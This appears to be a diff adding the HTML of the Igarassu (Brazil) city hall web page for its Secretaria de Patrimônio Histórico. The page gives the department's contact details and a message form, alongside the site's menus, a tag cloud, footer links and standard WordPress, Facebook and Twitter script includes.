+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/comunicacao/videos" title="Vídeos"><span class="ico">-</span> Vídeos</a></li>
+					</ul>
+                </div>
+            </li>
+			<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/projetos-e-acoes" title="Projetos e Ações">Projetos e Ações</a>
+				<div class="submenu-six">
+                	<span class="arrow ico">-</span>
+                	<ul class="submenu">
+					                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/projetos-e-acoes/acao-social/" title="Ação Social"><span class="ico">-</span> Ação Social</a></li>
+					                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/projetos-e-acoes/saude/" title="Saúde"><span class="ico">-</span> Saúde</a></li>
+					                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/projetos-e-acoes/educacao/" title="Educação"><span class="ico">-</span> Educação</a></li>
+					                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/projetos-e-acoes/meio-ambiente/" title="Meio Ambiente"><span class="ico">-</span> Meio Ambiente</a></li>
+					                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/projetos-e-acoes/prefeitura-em-acao/" title="Prefeitura em Ação"><span class="ico">-</span> Prefeitura em Ação</a></li>
+					                    </ul>
+                </div>
+            </li>
+        </ul>
+    </div>
+    
+    <div id="content">
+<div class="content-meta">
+	<div class="container">
+    	<h2 class="title">Secretaria de Patrimônio Histórico</h2>
+    	<div class="breadcrumbs">
+        	<a href="http://www.mobic.com.br/clientes/prefeitura-igarassu">Home</a><span class="ico arrow">-</span>
+            			<a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/">Secretarias e Orgãos</a><span class="ico arrow">-</span>
+                        <span class="current">Secretaria de Patrimônio Histórico</span>
+        </div>
+    </div>
+</div>
+<div class="content container">
+	<div class="col-content">
+	    	<div class="box-content">
+        	            
+            <div class="entry-content">
+            	            	                
+                                <div class="ico address">
+                	<div class="data">
+                    	<p><strong>Endereço:</strong> Praça da Bandeira, 14, Centro. CEP 53.600-000</p>
+<p><strong>E-mail:</strong> p_pmig@hotmail.com</p>
+<p><strong>Fone:</strong> 3543.1674</p>
+                    </div>
+                </div>
+                                
+                                
+                <hr />
+                                <div class="box-contact">
+                	<h3>Envie sua mensagem</h3>
+                   	<p>&nbsp;</p>
+<div class="wpcf7" id="wpcf7-f164-p160-o1"><form action="/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-patrimonio-historico/#wpcf7-f164-p160-o1" method="post" class="wpcf7-form" novalidate="novalidate">
+<div style="display: none;">
+<input type="hidden" name="_wpcf7" value="164" />
+<input type="hidden" name="_wpcf7_version" value="3.7.2" />
+<input type="hidden" name="_wpcf7_locale" value="pt_BR" />
+<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f164-p160-o1" />
+<input type="hidden" name="_wpnonce" value="55d748a5e4" />
+</div>
+<p><span class="wpcf7-form-control-wrap your-name"><input type="text" name="your-name" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" placeholder="Nome" /></span> </p>
+<p><span class="wpcf7-form-control-wrap your-email"><input type="email" name="your-email" value="" size="40" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email" aria-required="true" aria-invalid="false" placeholder="Email" /></span> </p>
+<p><span class="wpcf7-form-control-wrap your-message"><textarea name="your-message" cols="40" rows="10" class="wpcf7-form-control wpcf7-textarea" aria-invalid="false" placeholder="Mensagem"></textarea></span> </p>
+<p><input type="submit" value="Enviar" class="wpcf7-form-control wpcf7-submit" /></p>
+<div class="wpcf7-response-output wpcf7-display-none"></div></form></div>
+                </div>
+                                
+            </div>
+                    </div>
+		</div>
+                <div class="col-sidebar">
+            	<div class="box-assistance">
+                	<p class="title ico"><a href="#" title="Atendimento ao Contribuinte" class="ico">Atendimento ao Contribuinte</a></p>
+                    <ul class="links">
+                    	<li><a href="#" title="Nota Fiscal">Nota Fiscal</a></li>
+                    	<li><a href="#" title="ISS">ISS</a></li>
+                    	<li><a href="#" title="IPTU">IPTU</a></li>
+                    	<li><a href="#" title="CIM">CIM</a></li>
+                    </ul>
+                </div>
+				        	<div class="banner">
+                	<p><a href="http://transparenciagovernamental.com.br/igarassu/" title="Portal da Transparência"><img src="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/files_mf/1394482766_magicfields_imagem_1_1.jpg" alt="" /></a></p>
+                </div>
+			                <div class="box-facebook">
+                	<p class="title"><a href="#" title="Facebook">Facebook</a></p>
+                    <div class="fb-like-box" data-href="https://www.facebook.com/pages/Governo-Municipal-de-Igarassu/470097066372129" data-width="261" data-height="322" data-colorscheme="light" data-show-faces="true" data-header="false" data-stream="false" data-show-border="true"></div>
+                </div>
+                <div class="box-quick-search">
+                	<p class="title">Pesquisa Rápidaa</p>
+                    <div class="tagcloud">
+                                            <span id="0" class="wrd tagcloud4"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=administracao">administracao</a></span>
+                        <span id="1" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=agri">agri</a></span>
+                        <span id="2" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=arte-educadores">arte-educadores</a></span>
+                        <span id="3" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=biodiversidade">biodiversidade</a></span>
+                        <span id="4" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=civico">civico</a></span>
+                        <span id="5" class="wrd tagcloud3"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=civil">civil</a></span>
+                        <span id="6" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=cosme">cosme</a></span>
+                        <span id="7" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=criancas">criancas</a></span>
+                        <span id="8" class="wrd tagcloud5"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=da">da</a></span>
+                        <span id="9" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=damiao">damiao</a></span>
+                        <span id="10" class="wrd tagcloud10"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=de">de</a></span>
+                        <span id="11" class="wrd tagcloud3"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=defesa">defesa</a></span>
+                        <span id="12" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=desfile">desfile</a></span>
+                        <span id="13" class="wrd tagcloud0"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=diario">diario</a></span>
+                        <span id="14" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=divulga">divulga</a></span>
+                        <span id="15" class="wrd tagcloud3"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=dos">dos</a></span>
+                        <span id="16" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=econ">econ</a></span>
+                        <span id="17" class="wrd tagcloud8"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=educacao">educacao</a></span>
+                        <span id="18" class="wrd tagcloud4"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=em">em</a></span>
+                        <span id="19" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=encanta">encanta</a></span>
+                        <span id="20" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=exposicao">exposicao</a></span>
+                        <span id="21" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=festa">festa</a></span>
+                        <span id="22" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=gabinete">gabinete</a></span>
+                        <span id="23" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=hospitalizadas">hospitalizadas</a></span>
+                        <span id="24" class="wrd tagcloud7"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=igarassu">igarassu</a></span>
+                        <span id="25" class="wrd tagcloud4"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=informa">informa</a></span>
+                        <span id="26" class="wrd tagcloud0"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=licitacoes">licitacoes</a></span>
+                        <span id="27" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=lista">lista</a></span>
+                        <span id="28" class="wrd tagcloud3"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=municipal">municipal</a></span>
+                        <span id="29" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=na">na</a></span>
+                        <span id="30" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=noticias">noticias</a></span>
+                        <span id="31" class="wrd tagcloud4"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=para">para</a></span>
+                        <span id="32" class="wrd tagcloud5"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=prefeito">prefeito</a></span>
+                        <span id="33" class="wrd tagcloud4"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=professores">professores</a></span>
+                        <span id="34" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=publica">publica</a></span>
+                        <span id="35" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=recebe">recebe</a></span>
+                        <span id="36" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=recebem">recebem</a></span>
+                        <span id="37" class="wrd tagcloud3"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=recursos">recursos</a></span>
+                        <span id="38" class="wrd tagcloud3"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=resultado">resultado</a></span>
+                        <span id="39" class="wrd tagcloud0"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=santos">santos</a></span>
+                        <span id="40" class="wrd tagcloud4"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=saude">saude</a></span>
+                        <span id="41" class="wrd tagcloud9"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=sec">sec</a></span>
+                        <span id="42" class="wrd tagcloud6"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=secretaria">secretaria</a></span>
+                        <span id="43" class="wrd tagcloud4"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=selecao">selecao</a></span>
+                        <span id="44" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=selecionados">selecionados</a></span>
+                        <span id="45" class="wrd tagcloud3"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=simplificada">simplificada</a></span>
+                        <span id="46" class="wrd tagcloud2"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=social">social</a></span>
+                        <span id="47" class="wrd tagcloud3"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=turismo">turismo</a></span>
+                        <span id="48" class="wrd tagcloud0"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=utilidade">utilidade</a></span>
+                        <span id="49" class="wrd tagcloud4"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/?s=visita">visita</a></span>
+                    </div>
+                </div>
+            </div>
+        	<p class="clear"></p></div>
+		<p class="clear"></p>
+    </div>
+    <div id="footer">
+    	<div class="row-one">
+        	<div class="container">
+	        	<p class="logo"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu" title="Prefeitura de Igarassu" class="ico">Prefeitura de Igarassu</a></p>
+            </div>
+        </div>
+		<div class="row-two">
+        	<div class="container">
+                <div class="col-one">
+                    <p class="title"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-prefeitura" title="A Prefeitura">A Prefeitura</a></p>
+                    <ul>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-prefeitura/agenda-do-prefeito" title="Agenda do Prefeito"><span class="ico">-</span> Agenda do Prefeito</a></li>  
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-prefeitura/licitacoes" title=""><span class="ico">-</span> Licitações</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-prefeitura/leis-municipais/" title=""><span class="ico">-</span> Leis Municipais</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-prefeitura/feriados-municipais" title="Feriados Municipais"><span class="ico">-</span> Feriados  Municipais</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-prefeitura/manual-da-marca" title="Manual da Marca"><span class="ico">-</span> Manual da Marca</a></li>
+                    </ul>
+                    <p class="title"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-cidade" title="A Cidade">A Cidade</a></p>
+                    <ul>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-cidade/conheca-igarassu" title="Conheça Igarassu"><span class="ico">-</span> Conheça Igarassu</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-cidade/perfil-dos-bairros/" title="Perfil dos Bairros"><span class="ico">-</span> Perfil dos Bairros</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-cidade/simbolos-oficiais" title="Símbolos Oficiais"><span class="ico">-</span> Símbolos Oficiais</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-cidade/hino-de-igarassu" title="Hino de Igarassu"><span class="ico">-</span> Hino de Igarassu</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu" title=""><span class="ico">-</span> Agenda Cultural</a></li>
+                    </ul>
+                    <p class="title"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/servicos" title="Serviços">Serviços</a></p>
+                    <ul>
+                        <li><a href="https://www.tinus.com.br/csp/IGARASSU/portal/index.csp?200hsVg8501arDDH73324hQpA8904og=SmqD63Ald029iNN79353stHhX334cSbgv4661V4417545xCJA197" title="Atendimento ao Contribuinte"><span class="ico">-</span> Atendimento ao 
+
+Contribuinte</a></li>
+                        
+                        <li><a href="https://www.tinus.com.br/csp/IGARASSU/portal/index.csp?200hsVg8501arDDH73324hQpA8904og=SmqD63Ald029iNN79353stHhX334cSbgv4661V4417545xCJA197" title=""><span class="ico">-</span> Declaração de Serviços</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/uploads/2014/05/RELAÇÃO-DE-ESCOLAS-MUNICIPAIS-outubro-2013.doc" title=""><span class="ico">-</span> Escolas Municipais</a></li>
+                        <li><a href="http://btechnology.com.br/portal_igarassu/" title=""><span class="ico">-</span> Acompanhamento de Processos</a></li>
+                        <li><a href="https://www.tinus.com.br/csp/IGARASSU/portal/index.csp?200hsVg8501arDDH73324hQpA8904og=SmqD63Ald029iNN79353stHhX334cSbgv4661V4417545xCJA197" title=""><span class="ico">-</span> Nota Fiscal Eletrônica</a></li>
+                        
+                    </ul>
+                </div>
+                <div class="col-two">
+                    <p class="title"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos" title="Secretarias e Orgãos">Secretarias</a></p>
+                    <ul>
+                        <!--<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/gabinete-do-prefeito" title="Gabinete do Prefeito"><span class="ico">-</span> Gabinete do 
+
+Prefeito</a></li>-->
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-do-governo/" title=""><span class="ico">-</span>Secretaria do Governo</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-comercio-e-servicos/" title=""><span class="ico">-</span>Secretaria de Comércio e Serviços</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-da-educacao/" title=""><span class="ico">-</span> Secretaria da Educação</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-da-saude/" title=""><span class="ico">-</span> Secretaria da Saúde</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-acao-social/" title=""><span class="ico">-</span> Secretaria de Ação Social</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-do-turismo-cultura-e-esportes//" title=""><span class="ico">-</span>Secretaria do Turismo, Cultura e Esportes</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-servicos-publicos/" title=""><span class="ico">-</span> Secretaria de Serviços Públicos</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-infraestrutura/" title=""><span class="ico">-</span> Secretaria de Infraestrutura</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-da-receita/" title=""><span class="ico">-</span> Secretaria da Receita</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-comunicacao/" title=""><span class="ico">-</span> Secretaria de Comunicação</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-articulacao/" title=""><span class="ico">-</span> Secretaria de Articulação Social</a></li>
+                        
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-certames-publicos/" title=""><span class="ico">-</span> Secretaria de Certames Públicos</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-do-meio-ambiente/" title=""><span class="ico">-</span> Secretaria do Meio Ambiente</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-da-administracao/" title=""><span class="ico">-</span> Secretaria da Administração</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-financas/" title=""><span class="ico">-</span> Secretaria de Finanças</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-do-planejamento/" title=""><span class="ico">-</span> Secretaria do Planejamento</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-agricultura-e-pesca/" title=""><span class="ico">-</span> Secretaria de Agricultura e Pesca</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-seguranca-cidada/" title=""><span class="ico">-</span> Secretaria de Segurança Cidadã</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-patrimonio-historico/" title=""><span class="ico">-</span> Secretaria de Patrimônio Histórico</a></li>
+					</ul>	
+					
+					<p class="title"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos" title="Orgãos">Orgãos</a></p>
+                    <ul>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/urbi/" title=""><span class="ico">-</span> URBI</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/depatran/" title=""><span class="ico">-</span> DEPATRAN</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/procon/" title=""><span class="ico">-</span> Procon</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/coordenadoria-da-juventude/" title=""><span class="ico">-</span> Coordenadoria da Juventude</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/controladoria/" title=""><span class="ico">-</span> Controladoria</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/guarda-municipal/" title=""><span class="ico">-</span> Guarda Municipal</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/procuradoria/" title=""><span class="ico">-</span> Procuradoria</a></li>                        
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/ouvidoria/" title=""><span class="ico">-</span> Ouvidoria</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/defesa-civil/" title=""><span class="ico">-</span> Defesa Civil</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/ademig/" title=""><span class="ico">-</span> ADEMIG</a></li>
+                    </ul>
+                </div>
+                <div class="col-three">
+                    <p class="title"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/comunicacao" title="Comunicação">Comunicação</a></p>
+                    <ul>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/comunicacao/fotos" title="Fotos"><span class="ico">-</span> Fotos</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/comunicacao/noticias" title="Notícias"><span class="ico">-</span> Notícias</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/comunicacao/videos" title="Vídeos"><span class="ico">-</span> Vídeos</a></li>
+                    </ul>
+                    <p class="title"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/projetos-e-acoes" title="Projetos e Ações">Projetos e Ações</a></p>
+                    <ul>
+					                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/projetos-e-acoes/acao-social/" title="Ação Social"><span class="ico">-</span> Ação Social</a></li>
+					                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/projetos-e-acoes/saude/" title="Saúde"><span class="ico">-</span> Saúde</a></li>
+					                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/projetos-e-acoes/educacao/" title="Educação"><span class="ico">-</span> Educação</a></li>
+					                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/projetos-e-acoes/meio-ambiente/" title="Meio Ambiente"><span class="ico">-</span> Meio Ambiente</a></li>
+					                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/projetos-e-acoes/prefeitura-em-acao/" title="Prefeitura em Ação"><span class="ico">-</span> Prefeitura em Ação</a></li>
+					                    </ul>
+                    <p class="title"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/fale-conosco/" title="Fale Conosco">Fale Conosco</a></p>
+                    <ul>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/fale-conosco/" title=""><span class="ico">-</span> Fale com a Prefeitura</a></li>
+                    </ul>
+                </div>
+			</div>
+            <p class="clear"></p>
+        </div>
+        <div class="row-three">
+        	<div class="container">
+            	<ul class="social">
+                	<li class="facebook"><a href="https://www.facebook.com/pages/Governo-Municipal-de-Igarassu/470097066372129" title="Facebook" class="ico">Facebook</a></li>
+                	<li class="flickr"><a href="https://www.flickr.com/photos/prefeituradeigarassu" title="Flickr" class="ico">Flickr</a></li>
+                	<li class="instagram"><a href="http://instagram.com/prefeituradeigarassu" title="Instagram" class="ico">Instagram</a></li>
+                	<li class="youtube"><a href="ttps://www.youtube.com/channel/UCTTuYYmCJZvlmYEViTjkC_w" title="Youtube" class="ico">Youtube</a></li>
+                	<li class="twitter"><a href="https://twitter.com/GovernoIgarassu" title="Twitter" class="ico">Twitter</a></li>
+					<!--<li class="SoundCloud"><a href="https://soundcloud.com/prefeitura-de-igarassu" title="SoundCloud" class="ico">SoundCloud</a></li> -->
+                </ul>
+                <p class="poweredy"><a href="http://www.mobic.com.br/" class="ico" target="_blank" title="Desenvolvido por Mobic">Mobic</a></p>
+			</div>
+        </div>
+    </div>
+<script type="text/javascript" src="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/library/media/js/default.js"></script>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/pt_BR/all.js#xfbml=1&appId=";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p
+
++'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+<script type='text/javascript' src='http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-includes/js/hoverIntent.min.js?ver=r7'></script>
+<script type='text/javascript' src='http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-includes/js/comment-reply.min.js?ver=3.9.26'></script>
+<script type='text/javascript' src='http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.50.0-2014.02.05'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"http:\/\/www.mobic.com.br\/clientes\/prefeitura-igarassu\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","sending":"Enviando ..."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=3.7.2'></script>
+</body>
+</html>
